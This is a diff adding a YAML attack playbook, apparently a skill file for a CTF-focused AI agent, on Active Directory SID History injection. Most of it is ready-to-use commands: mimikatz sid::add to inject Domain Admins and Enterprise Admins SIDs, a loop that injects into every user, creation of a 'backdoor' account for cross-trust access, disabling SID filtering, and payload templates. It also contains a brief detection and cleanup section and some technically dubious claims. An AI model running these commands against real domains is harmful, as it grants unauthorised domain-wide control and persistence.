@@ -1,0 +1,317 @@
+name: sid_history_attack
+description: SID History攻击 - 跨域权限提升技术，利用SID History属性注入高权限SID实现域间权限迁移和提升
+version: "2.0"
+author: CTF-Agent Team
+tags: [sid-history, active-directory, cross-domain, privilege-escalation, domain-trust]
+priority: high
+
+# 使用场景
+scenarios:
+  - 跨域森林权限提升
+  - 域信任关系滥用
+  - SID注入攻击
+  - 域间迁移遗留SID利用
+  - AdminSDHolder绕过
+
+# 核心技术
+techniques:
+  - SID History Injection: 向用户/组注入高权限SID
+  - Cross-Domain Privilege Escalation: 利用跨域信任提升权限
+  - Domain Trust Abuse: 滥用域信任关系
+  - SID Filtering Bypass: 绕过SID过滤机制
+  - AdminSDHolder Protection Bypass: 通过SID History绕过保护
+
+# 工具列表
+tools:
+  - mimikatz: SID History操作和注入
+  - PowerView: AD枚举和信任关系分析
+  - Active Directory Explorer: SID查看
+  - BloodHound: SID History路径分析
+  - lsaaddsid: SID注入工具
+  - DSInternals: PowerShell AD操作模块
+
+# SID History基础
+basics:
+  - concept: |
+      # SID History概述
+
+      # SID History是什么?
+      # - 用于域迁移时保留原始SID
+      # - 允许用户在迁移后仍能访问原域资源
+      # - 存储在sIDHistory属性中
+
+      # 为什么危险?
+      # - 可以注入任意SID
+      # - 可能包含高权限SID(如Domain Admins)
+      # - 绕过某些ACL检查
+
+      # SID格式:
+      # S-1-5-21-DomainRID-ObjectRID
+      # 例如: S-1-5-21-123456789-1234567890-1234567890-512 (Domain Admins)
+
+  - important_sids: |
+      # 重要SID列表
+
+      # Well-known SIDs
+      S-1-5-32-544   # Administrators (本地管理员组)
+      S-1-5-32-548   # Account Operators
+      S-1-5-32-549   # Server Operators
+      S-1-5-32-550   # Print Operators
+      S-1-5-32-551   # Backup Operators
+      S-1-5-32-552   # Replicators
+
+      # Domain SIDs (需要替换DomainRID)
+      S-1-5-21-DomainRID-512   # Domain Admins
+      S-1-5-21-DomainRID-513   # Domain Users
+      S-1-5-21-DomainRID-515   # Domain Guests
+      S-1-5-21-DomainRID-516   # Domain Controllers
+      S-1-5-21-DomainRID-518   # Schema Admins
+      S-1-5-21-DomainRID-519   # Enterprise Admins
+      S-1-5-21-DomainRID-520   # Group Policy Creator Owners
+
+      # 特殊SID
+      S-1-5-21-DomainRID-500   # Administrator账户
+      S-1-1-0                  # Everyone
+      S-1-5-11                 # Authenticated Users
+
+# 信息收集
+reconnaissance:
+  - trust_analysis: |
+      # 域信任关系分析
+
+      # PowerView获取信任信息
+      Get-DomainTrust -Domain target.local
+      Get-DomainTrustMapping
+
+      # 检查信任类型
+      # - Inbound: 其他域信任本域
+      # - Outbound: 本域信任其他域
+      # - Bidirectional: 双向信任
+
+      # 检查SID过滤状态
+      netdom trust /domain:target.local /quarantine
+
+      # 检查信任属性
+      Get-DomainTrust | Select-Object TrustType, TrustDirection, TrustAttributes
+
+  - sid_history_check: |
+      # 检查现有SID History
+
+      # 使用PowerView
+      Get-DomainUser -LDAPFilter "(sIDHistory=*)" | Select-Object name, sIDHistory
+      Get-DomainGroup -LDAPFilter "(sIDHistory=*)" | Select-Object name, sIDHistory
+
+      # 使用AD PowerShell
+      Get-ADUser -LDAPFilter "(sIDHistory=*)" -Properties sIDHistory
+      Get-ADGroup -LDAPFilter "(sIDHistory=*)" -Properties sIDHistory
+
+      # BloodHound分析
+      # 查找SID History相关路径
+
+# SID History注入攻击
+attack_techniques:
+  - mimikatz_injection: |
+      # Mimikatz SID History注入
+
+      # 前置条件:
+      # 1. 需要Domain Admin或更高权限
+      # 2. 或有DS-Replication-Get-Changes权限
+
+      # 注入Domain Admins SID到用户
+      mimikatz # privilege::debug
+      mimikatz # lsadump::lsa /patch
+
+      # 使用sid::add模块
+      mimikatz # sid::add /sam:targetuser /new:S-1-5-21-DomainRID-512
+
+      # 注入Enterprise Admins SID
+      mimikatz # sid::add /sam:targetuser /new:S-1-5-21-DomainRID-519
+
+      # 验证注入结果
+      mimikatz # lsadump::dcsync /user:targetuser
+      # 查看sIDHistory属性
+
+  - dsinternals_injection: |
+      # DSInternals PowerShell注入
+
+      Import-Module DSInternals
+
+      # 获取目标域SID
+      Get-ADDomain -Identity target.local
+
+      # 注入SID History
+      Set-ADUser -Identity targetuser -Add @{sIDHistory="S-1-5-21-DomainRID-512"}
+
+      # 或使用DSInternals
+      Add-SIDHistory -SamAccountName targetuser -SIDHistory S-1-5-21-DomainRID-512
+
+      # 批量注入
+      Get-ADUser -Filter * | ForEach-Object {
+        Add-SIDHistory -SamAccountName $_.SamAccountName -SIDHistory "S-1-5-21-DomainRID-512"
+      }
+
+  - cross_domain_attack: |
+      # 跨域SID History攻击
+
+      # 场景: 域A信任域B，在域A有权限
+
+      # 1. 获取域B的Domain Admins SID
+      Get-DomainSID -Domain targetB.local
+      # 结果: S-1-5-21-B-RID
+
+      # Domain Admins SID: S-1-5-21-B-RID-512
+
+      # 2. 在域A创建用户并注入域B的SID
+      New-ADUser -Name "backdoor" -SamAccountName "backdoor"
+
+      # 3. 注入域B的Domain Admins SID
+      mimikatz # sid::add /sam:backdoor /new:S-1-5-21-B-RID-512
+
+      # 4. 使用backdoor账户访问域B资源
+      # 由于SID History包含域B的Domain Admins SID
+      # 可以获得域B的Domain Admin权限
+
+      # 5. 访问域B
+      Enter-PSSession -ComputerName DC_B -Credential backdoor@A.local
+
+# SID过滤绕过
+sid_filtering_bypass:
+  - techniques: |
+      # SID过滤机制
+
+      # 默认情况下，跨森林信任会过滤SID History
+      # 只允许以下SID通过:
+      # - S-1-5-21-DomainRID-513 (Domain Users)
+      # - S-1-5-21-DomainRID-514 (Domain Guests)
+      # - S-1-1-0 (Everyone)
+      # - S-1-5-11 (Authenticated Users)
+
+      # 绕过方法:
+
+      # 1. 检查SID过滤状态
+      netdom trust /domain:target.local /quarantine
+      # 如果返回"No"表示SID过滤未启用
+
+      # 2. 禁用SID过滤(需要高权限)
+      netdom trust /domain:target.local /quarantine:No
+
+      # 3. 利用TGT delegation
+      # 通过Kerberos delegation绕过
+
+      # 4. 特定信任绕过
+      # 检查TrustAttributes是否包含QUARANTINED
+
+# AdminSDHolder绕过
+adminsdholder_bypass:
+  - technique: |
+      # AdminSDHolder保护机制
+
+      # AdminSDHolder保护以下组:
+      # - Administrators
+      # - Domain Admins
+      # - Enterprise Admins
+      # - Schema Admins
+      # - Account Operators
+      # - Server Operators
+      # - Backup Operators
+      # - Print Operators
+
+      # 每60分钟会重置这些组的ACL
+
+      # 绕过方法:
+      # 使用SID History注入而非直接添加用户到组
+
+      # 注入Domain Admins SID而非加入组
+      mimikatz # sid::add /sam:targetuser /new:S-1-5-21-DomainRID-512
+
+      # 这样不会被AdminSDHolder保护机制检测
+
+# 检测和清理
+detection_cleanup:
+  - detection: |
+      # 检测SID History攻击
+
+      # 1. 监控sIDHistory属性修改
+      # 事件ID: 4738 (用户账户更改)
+      # 事件ID: 4728 (组成员添加)
+
+      # 2. 定期检查异常SID History
+      Get-ADUser -LDAPFilter "(sIDHistory=*)" -Properties sIDHistory
+
+      # 3. 检查跨森林信任的SID History
+
+      # 4. BloodHound分析
+      # 查找异常SID History路径
+
+      # 5. 使用Azure AD Connect检测
+      # 检查同步用户的SID History
+
+  - cleanup: |
+      # 清理SID History
+
+      # 使用PowerShell清除
+      Set-ADUser -Identity targetuser -Remove @{sIDHistory="S-1-5-21-DomainRID-512"}
+
+      # 使用DSInternals
+      Remove-SIDHistory -SamAccountName targetuser
+
+      # 使用mimikatz
+      mimikatz # sid::clear /sam:targetuser
+
+      # 批量清理
+      Get-ADUser -LDAPFilter "(sIDHistory=*)" | ForEach-Object {
+        Remove-SIDHistory -SamAccountName $_.SamAccountName
+      }
+
+# 完整攻击流程
+attack_chain:
+  - step1: "信息收集 - 分析域信任关系"
+  - step2: "获取目标域SID"
+  - step3: "创建或选择目标用户"
+  - step4: "注入高权限SID"
+  - step5: "验证注入成功"
+  - step6: "使用注入账户访问资源"
+  - step7: "维持权限持久化"
+
+# Payload模板
+payloads:
+  - name: "SID History注入"
+    template: |
+      # SID History注入Payload
+
+      # 使用mimikatz
+      privilege::debug
+      sid::add /sam:backdoor /new:S-1-5-21-DomainRID-512
+
+      # 使用DSInternals
+      Add-SIDHistory -SamAccountName backdoor -SIDHistory S-1-5-21-DomainRID-512
+
+      # 验证
+      Get-ADUser backdoor -Properties sIDHistory | Select-Object sIDHistory
+
+  - name: "跨域信任利用"
+    template: |
+      # 跨域信任利用Payload
+
+      # 假设域A信任域B
+
+      # 1. 在域A获取域B信息
+      Get-DomainTrust -Domain B.local
+
+      # 2. 获取域B的SID
+      $DomainBSID = (Get-DomainSID -Domain B.local)
+      $DomainAdminsSID = "$DomainBSID-512"
+
+      # 3. 在域A注入
+      mimikatz.exe "sid::add /sam:backdoor /new:$DomainAdminsSID exit"
+
+      # 4. 使用域A账户访问域B
+      Enter-PSSession -ComputerName DC_B.B.local -Credential backdoor@A.local
+
+# 参考资源
+references:
+  - https://adsecurity.org/?p=1772
+  - https://posts.specterops.io/sid-history-as-a-persistence-mechanism
+  - https://github.com/GhostPack/PowerView
+  - https://github.com/gentilkiwi/mimikatz
+  - https://www.dsinternals.com/
